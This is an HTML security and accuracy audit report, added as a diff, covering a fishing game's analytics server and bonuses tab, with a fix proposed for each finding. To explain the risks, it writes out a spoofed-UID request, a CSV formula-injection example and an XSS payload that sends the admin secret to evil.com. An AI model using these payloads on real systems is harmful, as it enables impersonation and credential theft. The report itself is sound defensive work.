@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Patient Angler — Security & Accuracy Audit v0.1.17</title>
+<style>
+  :root {
+    --bg:        #f9f7f4;
+    --bg2:       #efecea;
+    --border:    #d8d2c8;
+    --text:      #1c1917;
+    --dim:       #6b6560;
+    --crit:      #b91c1c;
+    --crit-bg:   #fef2f2;
+    --high:      #c2410c;
+    --high-bg:   #fff7ed;
+    --med:       #a16207;
+    --med-bg:    #fefce8;
+    --low:       #166534;
+    --low-bg:    #f0fdf4;
+    --ok:        #15803d;
+    --ok-bg:     #f0fdf4;
+    --accent:    #1e40af;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg:#18181b;--bg2:#27272a;--border:#3f3f46;--text:#f4f4f5;--dim:#a1a1aa;
+      --crit:#fca5a5;--crit-bg:#450a0a;--high:#fdba74;--high-bg:#431407;
+      --med:#fde68a;--med-bg:#422006;--low:#86efac;--low-bg:#052e16;
+      --ok:#4ade80;--ok-bg:#052e16;--accent:#93c5fd;
+    }
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { font-size: 16px; -webkit-text-size-adjust: 100%; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.6;
+    padding: 0 0 64px;
+  }
+
+  .report-header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 32px 40px;
+  }
+  .report-header h1 { font-size: 1.5rem; font-weight: 700; letter-spacing: -.02em; margin-bottom: 4px; }
+  .report-meta { font-size: .875rem; color: var(--dim); display: flex; gap: 24px; flex-wrap: wrap; margin-top: 8px; }
+
+  .body-wrap { max-width: 900px; margin: 0 auto; padding: 0 24px; }
+
+  .summary-bar {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
+    gap: 12px;
+    margin: 32px 0;
+  }
+  .sum-cell { border-radius: 8px; padding: 14px 16px; border: 1px solid var(--border); }
+  .sum-cell .count { font-size: 2rem; font-weight: 800; line-height: 1; }
+  .sum-cell .label { font-size: .75rem; text-transform: uppercase; letter-spacing: .06em; color: var(--dim); margin-top: 4px; }
+  .sum-cell.crit { background: var(--crit-bg); } .sum-cell.crit .count { color: var(--crit); }
+  .sum-cell.high { background: var(--high-bg); } .sum-cell.high .count { color: var(--high); }
+  .sum-cell.med  { background: var(--med-bg);  } .sum-cell.med  .count { color: var(--med);  }
+  .sum-cell.low  { background: var(--low-bg);  } .sum-cell.low  .count { color: var(--low);  }
+  .sum-cell.ok   { background: var(--ok-bg);   } .sum-cell.ok   .count { color: var(--ok);   }
+
+  .part-header {
+    font-size: 1.125rem; font-weight: 700; color: var(--text);
+    border-top: 2px solid var(--border); padding-top: 28px;
+    margin: 40px 0 4px; letter-spacing: -.01em;
+  }
+  .section-label {
+    font-size: .75rem; text-transform: uppercase; letter-spacing: .1em;
+    color: var(--dim); margin: 28px 0 10px;
+    border-bottom: 1px solid var(--border); padding-bottom: 4px;
+  }
+
+  .finding { border: 1px solid var(--border); border-radius: 8px; margin-bottom: 12px; overflow: hidden; }
+  .finding-head {
+    display: flex; align-items: center; gap: 10px;
+    padding: 12px 16px; background: var(--bg2); flex-wrap: wrap;
+  }
+  .sev-badge {
+    font-size: .7rem; font-weight: 700; text-transform: uppercase;
+    letter-spacing: .08em; padding: 2px 8px; border-radius: 4px; flex-shrink: 0;
+  }
+  .sev-badge.CRITICAL { background: var(--crit-bg); color: var(--crit); border: 1px solid var(--crit); }
+  .sev-badge.HIGH     { background: var(--high-bg); color: var(--high); border: 1px solid var(--high); }
+  .sev-badge.MEDIUM   { background: var(--med-bg);  color: var(--med);  border: 1px solid var(--med);  }
+  .sev-badge.LOW      { background: var(--low-bg);  color: var(--low);  border: 1px solid var(--low);  }
+  .sev-badge.OK       { background: var(--ok-bg);   color: var(--ok);   border: 1px solid var(--ok);   }
+  .finding-title { font-size: .9375rem; font-weight: 600; color: var(--text); flex: 1; }
+  .finding-loc {
+    font-size: .75rem; font-family: "SF Mono","Cascadia Code","Consolas",monospace;
+    color: var(--dim); background: var(--bg); border: 1px solid var(--border);
+    border-radius: 4px; padding: 2px 7px; flex-shrink: 0;
+  }
+  .finding-body { padding: 14px 16px; font-size: .875rem; line-height: 1.65; }
+  .finding-body p { margin-bottom: 10px; }
+  .finding-body p:last-child { margin-bottom: 0; }
+  .finding-body ul { margin: 8px 0 8px 20px; font-size: .875rem; }
+  .finding-body strong { color: var(--text); font-weight: 600; }
+
+  code {
+    font-family: "SF Mono","Cascadia Code","Consolas",monospace;
+    font-size: .82em; background: var(--bg2); border: 1px solid var(--border);
+    border-radius: 3px; padding: 1px 5px;
+  }
+  pre {
+    background: var(--bg2); border: 1px solid var(--border); border-radius: 6px;
+    padding: 12px 14px; overflow-x: auto;
+    font-family: "SF Mono","Cascadia Code","Consolas",monospace;
+    font-size: .82em; line-height: 1.55; margin: 10px 0; white-space: pre;
+  }
+
+  .data-table { width: 100%; border-collapse: collapse; font-size: .82em; margin: 10px 0; }
+  .data-table th { text-align: left; padding: 6px 10px; border: 1px solid var(--border); background: var(--bg2); font-weight: 600; }
+  .data-table td { padding: 6px 10px; border: 1px solid var(--border); }
+  .data-table tr:nth-child(even) td { background: var(--bg2); }
+
+  .ok-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 8px; margin: 10px 0; }
+  .ok-row {
+    background: var(--ok-bg); border: 1px solid var(--low); border-radius: 6px;
+    padding: 8px 12px; font-size: .8125rem; color: var(--text);
+    display: flex; align-items: center; gap: 8px;
+  }
+  .ok-row::before { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--ok); flex-shrink: 0; }
+
+  .priority-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+  .priority-table th {
+    font-size: .75rem; text-transform: uppercase; letter-spacing: .07em;
+    color: var(--dim); font-weight: 600; padding: 8px 12px;
+    border-bottom: 2px solid var(--border); text-align: left;
+  }
+  .priority-table td { padding: 10px 12px; font-size: .875rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+  .priority-table tr:last-child td { border-bottom: none; }
+  .priority-table tr:nth-child(even) td { background: var(--bg2); }
+  .rank { font-weight: 700; font-variant-numeric: tabular-nums; width: 28px; }
+  .fix-title { font-weight: 500; }
+  .fix-effort { color: var(--dim); font-size: .8125rem; margin-top: 2px; }
+</style>
+</head>
+<body>
+
+<div class="report-header">
+  <h1>Patient Angler — Security &amp; Accuracy Audit</h1>
+  <div class="report-meta">
+    <span>Version v0.1.17 / Build 23</span>
+    <span>Scope: paAnalytics.ts &middot; analytics.js &middot; auth.js &middot; Statistics Tab 8</span>
+    <span>Mode: read-only inspection &mdash; no code changes</span>
+    <span>Date: 2026-07-10</span>
+  </div>
+</div>
+
+<div class="body-wrap">
+
+  <div class="summary-bar">
+    <div class="sum-cell crit"><div class="count">1</div><div class="label">Critical</div></div>
+    <div class="sum-cell high"><div class="count">5</div><div class="label">High</div></div>
+    <div class="sum-cell med"><div class="count">5</div><div class="label">Medium</div></div>
+    <div class="sum-cell low"><div class="count">3</div><div class="label">Low</div></div>
+    <div class="sum-cell ok"><div class="count">16</div><div class="label">Verified OK</div></div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════
+       PART 1 — ANALYTICS SECURITY
+  ════════════════════════════════════════════════ -->
+  <div class="part-header">Part 1 — Player Analytics Security Audit</div>
+
+  <div class="section-label">1.1 Authentication Model</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge CRITICAL">Critical</span>
+      <span class="finding-title">UID spoofing — any client can impersonate any player</span>
+      <span class="finding-loc">paAnalytics.ts:41–53</span>
+    </div>
+    <div class="finding-body">
+      <p><code>verifyUid()</code> has a dual-path design: it tries Firebase token verification first, but if the <code>Authorization</code> header is absent <em>or</em> if <code>verifyIdToken()</code> throws for any reason, it silently falls through and returns the raw <code>uid</code> from the request body with no further validation.</p>
+      <pre>if (!token) return body.uid ?? null;          // fallthrough A: no header
+try { const d = await verifyIdToken(token); return d.uid; }
+catch { return body.uid ?? null; }            // fallthrough B: bad/expired token</pre>
+      <p><strong>Attack:</strong> send <code>POST /pa/analytics/progress</code> with no <code>Authorization</code> header and <code>{ uid: "victim-uid", ... }</code> in the body. The server treats the body UID as authentic and writes the attacker's payload under the victim's row. Every analytics endpoint that calls <code>verifyUid()</code> is equally affected: progress, milestones, delete.</p>
+      <p><strong>Fix:</strong> on either fallback path, return <code>null</code> and let the caller return 401. Remove the body-UID fallback entirely — the verified Firebase token UID is the only acceptable source of identity.</p>
+    </div>
+  </div>
+
+  <div class="section-label">1.2 Admin Authorization</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge HIGH">High</span>
+      <span class="finding-title">PA_ADMIN_SECRET embedded verbatim in admin dashboard HTML and CSV download URL</span>
+      <span class="finding-loc">paAnalytics.ts:serveAdminDashboard</span>
+    </div>
+    <div class="finding-body">
+      <p>The admin dashboard injects the secret into its own JavaScript bundle:</p>
+      <pre>const SECRET = ${JSON.stringify(secret)};   // plaintext in page source</pre>
+      <p>It also constructs the Export CSV link with the secret in the query string:</p>
+      <pre>&lt;a href="/pa/admin/export-csv?secret=${secret}"&gt;Export CSV&lt;/a&gt;</pre>
+      <p>Consequences: (a) anyone who opens DevTools &rarr; Sources can extract the secret and use it against any admin endpoint without any login; (b) the secret appears in browser history, server access logs, referrer headers forwarded to any third-party resource on the page, and Chrome sync data.</p>
+      <p><strong>Fix:</strong> authenticate the dashboard with a signed cookie set at login. The export endpoint verifies the same cookie — the secret never leaves the server. Alternatively, generate the CSV client-side via <code>fetch()</code> with the cookie credential and a blob URL, so the secret is never in a URL.</p>
+    </div>
+  </div>
+
+  <div class="section-label">1.3 CSV Export Security</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge MEDIUM">Medium</span>
+      <span class="finding-title">CSV formula injection — player-controlled strings are not prefixed</span>
+      <span class="finding-loc">paAnalytics.ts:handleAdminExportCsv</span>
+    </div>
+    <div class="finding-body">
+      <p>The <code>escape()</code> helper wraps values in double quotes and escapes internal quotes, but does not prefix values that begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code>. A player whose UID or snapshot field starts with <code>=HYPERLINK(...)</code> can execute arbitrary spreadsheet formulas when the CSV is opened in Excel or LibreOffice Calc.</p>
+      <p><strong>Fix:</strong> add one guard at the top of <code>escape()</code>:</p>
+      <pre>if (/^[=+\-@\t\r]/.test(str)) str = "'" + str;</pre>
+    </div>
+  </div>
+
+  <div class="section-label">1.4 SQL Injection Protection</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge LOW">Low</span>
+      <span class="finding-title">Admin sort column interpolated into SQL — allowlist present but <code>days_since_first_play</code> missing</span>
+      <span class="finding-loc">paAnalytics.ts:handleAdminPlayers</span>
+    </div>
+    <div class="finding-body">
+      <p>The sort parameter is validated against an <code>ALLOWED_SORT</code> array before being interpolated into <code>ORDER BY ${params.sort}</code>, blocking SQL injection for all listed columns. All user-data queries use <code>$1</code>-style parameterisation correctly. The only gap is that <code>days_since_first_play</code> is absent from <code>ALLOWED_SORT</code> — if the admin dashboard UI exposes this sort option, the request falls back to the default silently. A functionality issue, not a security risk.</p>
+      <p><strong>Fix:</strong> add <code>'days_since_first_play'</code> to <code>ALLOWED_SORT</code> and implement it as a computed <code>EXTRACT</code> expression in the SELECT, or remove the sort option from the dashboard UI.</p>
+    </div>
+  </div>
+
+  <div class="section-label">1.5 Input Validation</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge MEDIUM">Medium</span>
+      <span class="finding-title">snapshotData inserted without size limit — storage DoS risk</span>
+      <span class="finding-loc">paAnalytics.ts:insertMilestones (lines ~397–413)</span>
+    </div>
+    <div class="finding-body">
+      <p><code>insertMilestones()</code> accepts <code>snapshotData</code> from the request body and inserts it as JSONB directly, with no check on serialized size. A malicious client sending a 50 MB <code>snapshotData</code> object on every 5-minute heartbeat could exhaust the Railway PostgreSQL disk quota within hours.</p>
+      <p><strong>Fix:</strong> reject the request before any DB operation if the serialized payload exceeds a safe threshold:</p>
+      <pre>if (JSON.stringify(snapshotData).length > 65536)
+  return res.status(400).json({ error: 'snapshotData too large' });</pre>
+    </div>
+  </div>
+
+  <div class="section-label">1.6 Rate Limiting</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge LOW">Low</span>
+      <span class="finding-title">No rate limiting on analytics endpoints</span>
+      <span class="finding-loc">paAnalytics.ts (all routes)</span>
+    </div>
+    <div class="finding-body">
+      <p>No middleware (e.g. <code>express-rate-limit</code>) is applied to <code>/pa/analytics/*</code>. A single client can flood the endpoint with thousands of requests per minute, causing unnecessary DB writes and Railway billing inflation. The legitimate client fires one heartbeat every 5 minutes (12 req/hour per user).</p>
+      <p><strong>Fix:</strong> add <code>express-rate-limit</code> at ~20 req/hour per IP on the analytics routes with a small burst allowance.</p>
+    </div>
+  </div>
+
+  <div class="section-label">1.7 Privacy &amp; GDPR</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge MEDIUM">Medium</span>
+      <span class="finding-title">deletePlayerAnalytics() runs 3 separate DELETEs without a transaction</span>
+      <span class="finding-loc">paAnalytics.ts:173–177</span>
+    </div>
+    <div class="finding-body">
+      <p>The erasure flow issues three independent DELETE queries: <code>pa_player_progress</code>, then <code>pa_player_milestones</code>, then <code>pa_player_daily_progress</code>. If the process crashes or the DB connection drops after the first delete, the player's data is partially erased. GDPR Article 17 requires complete and verifiable erasure — partial deletion leaves the controller in breach.</p>
+      <p><strong>Fix:</strong> wrap all three deletes in a single transaction:</p>
+      <pre>await pool.query('BEGIN');
+await pool.query('DELETE FROM pa_player_progress WHERE uid=$1', [uid]);
+await pool.query('DELETE FROM pa_player_milestones WHERE uid=$1', [uid]);
+await pool.query('DELETE FROM pa_player_daily_progress WHERE uid=$1', [uid]);
+await pool.query('COMMIT');</pre>
+    </div>
+  </div>
+
+  <div class="section-label">1.8 XSS in Admin Dashboard</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge HIGH">High</span>
+      <span class="finding-title">Player-controlled strings inserted into dashboard HTML without escaping</span>
+      <span class="finding-loc">paAnalytics.ts:serveAdminDashboard</span>
+    </div>
+    <div class="finding-body">
+      <p>The admin dashboard renders player UIDs and snapshot data fetched from the database directly into the HTML template string. These values originated from client requests with no sanitization at ingestion. A player who submitted a crafted string like <code>&lt;img src=x onerror="fetch('https://evil.com?s='+SECRET)"&gt;</code> would have it rendered as live HTML in the admin's browser — and because <code>SECRET</code> is already on the page (finding 1.2), the XSS can exfiltrate the admin secret in a single exploit chain.</p>
+      <p><strong>Fix:</strong> escape all dynamic values before template insertion:</p>
+      <pre>const esc = s => String(s)
+  .replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&lt;')
+  .replace(/&gt;/g, '&gt;').replace(/"/g, '&amp;quot;');</pre>
+      <p>Apply <code>esc()</code> to every player-derived value placed into the HTML string.</p>
+    </div>
+  </div>
+
+  <div class="section-label">1.9 Security Headers</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge LOW">Low</span>
+      <span class="finding-title">Admin dashboard missing X-Frame-Options and Content-Security-Policy</span>
+      <span class="finding-loc">paAnalytics.ts:serveAdminDashboard</span>
+    </div>
+    <div class="finding-body">
+      <p>The dashboard response sets no <code>X-Frame-Options</code> or <code>Content-Security-Policy</code> header, enabling clickjacking and widening the XSS impact surface. Two header additions fix both:</p>
+      <pre>res.setHeader('X-Frame-Options', 'DENY');
+res.setHeader('Content-Security-Policy',
+  "default-src 'none'; script-src 'self'; style-src 'unsafe-inline'");</pre>
+    </div>
+  </div>
+
+  <div class="section-label">1.10 Client Failure Safety — analytics.js field accuracy</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge HIGH">High</span>
+      <span class="finding-title">Four analytics fields always send wrong values — all DB rows corrupted since deployment</span>
+      <span class="finding-loc">analytics.js:29–196</span>
+    </div>
+    <div class="finding-body">
+      <p><code>buildAnalyticsSnapshot()</code> references identifiers that do not exist in game.js:</p>
+      <table class="data-table">
+        <tr>
+          <th>Field sent to server</th>
+          <th>Value actually sent</th>
+          <th>Correct reference</th>
+        </tr>
+        <tr>
+          <td><code>APP_VERSION</code></td>
+          <td><code>null</code> (identifier undefined)</td>
+          <td><code>GAME_VERSION</code> in version.js</td>
+        </tr>
+        <tr>
+          <td><code>G.equippedRod</code></td>
+          <td><code>'basic_rod'</code> always (field doesn't exist)</td>
+          <td><code>G.currentRod</code></td>
+        </tr>
+        <tr>
+          <td><code>G.abyssData?.resetCount</code></td>
+          <td><code>0</code> always (path doesn't exist)</td>
+          <td><code>G.prestigeCount</code></td>
+        </tr>
+        <tr>
+          <td><code>buildNumber: null</code></td>
+          <td><code>null</code> (hardcoded)</td>
+          <td><code>BUILD_NUMBER</code> in version.js</td>
+        </tr>
+      </table>
+      <p>Every analytics row in the database records the wrong app version, wrong current rod, and zero prestige count for all players. Historical rows since deployment cannot be corrected retroactively — fixing the references will recover accuracy from the next session onward.</p>
+    </div>
+  </div>
+
+  <div class="section-label">1.11 Milestone Tracking Accuracy</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge MEDIUM">Medium</span>
+      <span class="finding-title">first_legendary_fish never fires; first_competition fires for wrong players</span>
+      <span class="finding-loc">analytics.js:199–290</span>
+    </div>
+    <div class="finding-body">
+      <p><strong>first_legendary_fish:</strong> the key exists in <code>MILESTONE_KEYS</code> but <code>_anlBuildMilestones()</code> contains no <code>check('first_legendary_fish', ...)</code> call. The milestone is never recorded for any player regardless of catches.</p>
+      <p><strong>first_competition:</strong> fires whenever <code>achievementsCompleted &gt; 0</code>. Catching one fish unlocks the "First Cast" achievement, so this milestone fires for players who have never opened the Competition screen. The correct check is <code>G.stats.competitionsEntered &gt; 0</code> (or equivalent competition-participation state).</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge LOW">Low</span>
+      <span class="finding-title">scheduleAnalyticsHeartbeat() accumulates visibilitychange listeners on repeated calls</span>
+      <span class="finding-loc">analytics.js:364–376</span>
+    </div>
+    <div class="finding-body">
+      <p>Each call to <code>scheduleAnalyticsHeartbeat()</code> appends a new <code>visibilitychange</code> listener without removing the previous one. If the function is called more than once (e.g. after a save-reload cycle), multiple listeners accumulate and each page-hide fires multiple heartbeats. In practice the function is called once at init, making the risk low — but the code is fragile.</p>
+      <p><strong>Fix:</strong> extract the handler to a named variable and call <code>removeEventListener</code> before <code>addEventListener</code>.</p>
+    </div>
+  </div>
+
+
+  <!-- ═══════════════════════════════════════════════
+       PART 2 — BONUSES TAB ACCURACY
+  ════════════════════════════════════════════════ -->
+  <div class="part-header">Part 2 — Statistics Tab 8 Bonuses Accuracy Audit</div>
+
+  <div class="section-label">2.1 Issues Found</div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge HIGH">High</span>
+      <span class="finding-title">Competition Reward Multiplier displayed but not applied in getCompBaseReward()</span>
+      <span class="finding-loc">game.js:4758–4763 vs 425–431</span>
+    </div>
+    <div class="finding-body">
+      <p>The bonuses tab shows <strong>Reward Multiplier = getPearlCompSpiritMult() &times; getMasteryCompMult()</strong>. However, the only competition reward function is <code>getCompBaseReward(rank)</code> (lines 425–431), which computes rewards from hourly income alone and does not call either of these getters.</p>
+      <p>A codebase-wide search for <code>getPearlCompSpiritMult</code> and <code>getMasteryCompMult</code> finds them referenced only in their definition blocks (lines 819, 1065) and inside <code>_renderBonusesTab()</code>. Pearl Competition Spirit upgrades and Zone Mastery competition bonuses currently have zero effect — the bonuses tab shows a multiplier that does nothing.</p>
+      <p><strong>Fix (option A — implement it):</strong></p>
+      <pre>// getCompBaseReward — lines 425–431
+function getCompBaseReward(rank) {
+  const hourly = getEstimatedHourlyIncome();
+  const mult   = getPearlCompSpiritMult() * getMasteryCompMult();
+  if (rank === 1) return Math.round((500 + hourly * 0.05) * mult);
+  if (rank === 2) return Math.round((250 + hourly * 0.03) * mult);
+  if (rank === 3) return Math.round((100 + hourly * 0.01) * mult);
+  return 0;
+}</pre>
+      <p><strong>Fix (option B — hide until wired):</strong> remove the Competitions section from <code>_renderBonusesTab()</code> until the multipliers are applied.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge MEDIUM">Medium</span>
+      <span class="finding-title">"Diamond Earnings" label overstates the scope of getRodDiamondMult()</span>
+      <span class="finding-loc">game.js:4766–4768</span>
+    </div>
+    <div class="finding-body">
+      <p>The row is labelled <strong>Diamond Earnings</strong>, implying a global multiplier on all diamond income. In reality, <code>getRodDiamondMult()</code> is applied in only two places: selling a trophy fish individually (line 3384) and sell-all processing the trophy pile (line 3472).</p>
+      <p>The following diamond sources are <strong>not</strong> affected:</p>
+      <ul>
+        <li>First-catch legendary reward (+3 diamonds, line ~1998)</li>
+        <li>Lost Treasure event diamonds (line ~5208)</li>
+        <li>Redeem code grants</li>
+        <li>Season Pass diamond rewards</li>
+        <li>Competition diamond prizes</li>
+      </ul>
+      <p>A player with a high Mythic Rod tier sees e.g. <em>2.20x Diamond Earnings</em> and expects all diamond income to be boosted — only trophy sales are.</p>
+      <p><strong>Fix:</strong> rename to <strong>"Trophy Fish Sale Diamonds"</strong> and set the source description to <em>"Multiplies diamonds received when selling trophy fish"</em>.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="sev-badge LOW">Low</span>
+      <span class="finding-title">storageBase duplicated from storageCapacity() instead of being derived from it</span>
+      <span class="finding-loc">game.js:4651–4654</span>
+    </div>
+    <div class="finding-body">
+      <p>The "Base + items" source row in Storage Capacity manually recomputes <code>5 + reduce(ownedStorage)</code> instead of reading it from a sub-total exposed by <code>storageCapacity()</code>. The combined value calls the authoritative function so the total is correct — only the breakdown number is redundant. If the base formula ever changes (e.g. different starting capacity), this local copy would need a separate update. Not a display bug today.</p>
+    </div>
+  </div>
+
+  <div class="section-label">2.2 Verified Correct</div>
+
+  <div class="ok-grid">
+    <div class="ok-row">Fish Sell Value — exact match with <code>fishPileValue()</code> at line 1826</div>
+    <div class="ok-row">Abyss Fish Sell row — only shown when Abyss Rod tier &gt; 0; correct conditional</div>
+    <div class="ok-row">Base Auto Speed — exact match with <code>calcFishRate()</code> numerator at line 1291</div>
+    <div class="ok-row">Net Speed — <code>baseSpeed &times; getRodNetSpeedMult()</code> matches <code>calcFishRate</code> net branch</div>
+    <div class="ok-row">Fisherman Speed — <code>baseSpeed &times; getRodFishermanSpeedMult()</code> matches fisherman branch</div>
+    <div class="ok-row">Boat Speed — <code>baseSpeed &times; getRodBoatSpeedMult()</code> matches boat branch</div>
+    <div class="ok-row">Fleet Speed — <code>baseSpeed &times; getRodFleetSpeedMult()</code> matches fleet branch</div>
+    <div class="ok-row">Multi-Catch — calls <code>getMultiCatch()</code>, used identically in lines 1291 and 3760</div>
+    <div class="ok-row">Offline Production — shows the additional Pearl+Mastery offline multiplier only; Speed and Multi-Catch shown in their own rows</div>
+    <div class="ok-row">Taps to Catch — <code>Math.max(4, rod.clicks &minus; getPearlMasterAnglerReduce())</code> correct</div>
+    <div class="ok-row">Bite Speed — calls <code>getSpeedMult()</code>, the exact function driving manual bobber timing</div>
+    <div class="ok-row">Storage Capacity combined — calls authoritative <code>storageCapacity()</code> function</div>
+    <div class="ok-row">Loot rarity bonuses — Lucky Waters, Rare Catch, Trophy, Legendary, Treasure all read from correct getters</div>
+    <div class="ok-row">Seagull Reward — matches <code>getSeagullRewardMultiplier()</code> formula: 1 + count &times; 0.10</div>
+    <div class="ok-row">Seagull Interval — matches <code>getSeagullIntervalMs()</code> formula: 60000 &times; 0.95^count</div>
+    <div class="ok-row">Temporary Effects timers — <code>_updateBonusesTimers()</code> patches spans in-place; all five effects correctly tracked</div>
+    <div class="ok-row">Auto-Sell "Always On" branch — correctly checks <code>G.autoSellPermanent &amp;&amp; G.autoSellEnabled</code></div>
+    <div class="ok-row">Timer lifecycle — <code>_stopBonusesTimers()</code> called at top of every <code>_renderStatsContent()</code>; no leaks</div>
+  </div>
+
+
+  <!-- ═══════════════════════════════════════════════
+       PRIORITIZED TOP-10
+  ════════════════════════════════════════════════ -->
+  <div class="part-header">Prioritized Action List — Top 10 Fixes</div>
+
+  <div style="margin-top:12px;overflow-x:auto;">
+  <table class="priority-table">
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Fix</th>
+        <th>Sev</th>
+        <th>Effort</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td class="rank">1</td>
+        <td>
+          <div class="fix-title">Remove body-UID fallback from <code>verifyUid()</code> — return null (→ 401) when token is absent or fails</div>
+          <div class="fix-effort">paAnalytics.ts:41–53 &middot; Blocks full player impersonation exploit</div>
+        </td>
+        <td><span class="sev-badge CRITICAL">Critical</span></td>
+        <td>~10 min</td>
+      </tr>
+      <tr>
+        <td class="rank">2</td>
+        <td>
+          <div class="fix-title">Fix four wrong field names in <code>buildAnalyticsSnapshot()</code>: <code>APP_VERSION</code>&rarr;<code>GAME_VERSION</code>, <code>G.equippedRod</code>&rarr;<code>G.currentRod</code>, <code>G.abyssData?.resetCount</code>&rarr;<code>G.prestigeCount</code>, <code>buildNumber:null</code>&rarr;<code>BUILD_NUMBER</code></div>
+          <div class="fix-effort">analytics.js:29–196 &middot; Four one-line changes; recovers data accuracy from next session</div>
+        </td>
+        <td><span class="sev-badge HIGH">High</span></td>
+        <td>~10 min</td>
+      </tr>
+      <tr>
+        <td class="rank">3</td>
+        <td>
+          <div class="fix-title">Move PA_ADMIN_SECRET out of dashboard HTML and CSV URL; replace with cookie-based session auth</div>
+          <div class="fix-effort">paAnalytics.ts:serveAdminDashboard &middot; Also severs the XSS-to-secret-exfiltration chain</div>
+        </td>
+        <td><span class="sev-badge HIGH">High</span></td>
+        <td>~2 h</td>
+      </tr>
+      <tr>
+        <td class="rank">4</td>
+        <td>
+          <div class="fix-title">Escape all player-derived values in admin dashboard HTML with <code>esc()</code> helper</div>
+          <div class="fix-effort">paAnalytics.ts:serveAdminDashboard &middot; Eliminates stored XSS in the admin panel</div>
+        </td>
+        <td><span class="sev-badge HIGH">High</span></td>
+        <td>~30 min</td>
+      </tr>
+      <tr>
+        <td class="rank">5</td>
+        <td>
+          <div class="fix-title">Apply <code>getPearlCompSpiritMult() &times; getMasteryCompMult()</code> inside <code>getCompBaseReward()</code>, or hide Competition section from bonuses tab until wired</div>
+          <div class="fix-effort">game.js:425–431 &middot; Pearl/Mastery comp upgrades currently have zero effect</div>
+        </td>
+        <td><span class="sev-badge HIGH">High</span></td>
+        <td>~15 min</td>
+      </tr>
+      <tr>
+        <td class="rank">6</td>
+        <td>
+          <div class="fix-title">Wrap <code>deletePlayerAnalytics()</code> in a single BEGIN/COMMIT transaction</div>
+          <div class="fix-effort">paAnalytics.ts:173–177 &middot; GDPR Art. 17 compliance; atomic erasure</div>
+        </td>
+        <td><span class="sev-badge MEDIUM">Medium</span></td>
+        <td>~10 min</td>
+      </tr>
+      <tr>
+        <td class="rank">7</td>
+        <td>
+          <div class="fix-title">Reject oversized <code>snapshotData</code> in <code>insertMilestones()</code> before DB write (64 KB limit)</div>
+          <div class="fix-effort">paAnalytics.ts:~397 &middot; Prevents storage DoS on Railway Postgres</div>
+        </td>
+        <td><span class="sev-badge MEDIUM">Medium</span></td>
+        <td>~5 min</td>
+      </tr>
+      <tr>
+        <td class="rank">8</td>
+        <td>
+          <div class="fix-title">Rename bonuses tab label "Diamond Earnings" &rarr; "Trophy Fish Sale Diamonds" with corrected description</div>
+          <div class="fix-effort">game.js:4766 &middot; Prevents players misunderstanding Mythic Rod upgrade scope</div>
+        </td>
+        <td><span class="sev-badge MEDIUM">Medium</span></td>
+        <td>~5 min</td>
+      </tr>
+      <tr>
+        <td class="rank">9</td>
+        <td>
+          <div class="fix-title">Add <code>first_legendary_fish</code> check in <code>_anlBuildMilestones()</code>; fix <code>first_competition</code> condition to use actual competition participation state</div>
+          <div class="fix-effort">analytics.js:199–290 &middot; Recovers data quality for two lifecycle milestones</div>
+        </td>
+        <td><span class="sev-badge MEDIUM">Medium</span></td>
+        <td>~20 min</td>
+      </tr>
+      <tr>
+        <td class="rank">10</td>
+        <td>
+          <div class="fix-title">Prefix formula-injection chars in CSV <code>escape()</code>; add <code>X-Frame-Options</code> and <code>Content-Security-Policy</code> to admin dashboard response</div>
+          <div class="fix-effort">paAnalytics.ts:handleAdminExportCsv + serveAdminDashboard &middot; Two-line changes each</div>
+        </td>
+        <td><span class="sev-badge MEDIUM">Medium</span></td>
+        <td>~15 min</td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+
+</div><!-- /body-wrap -->
+</body>
+</html>
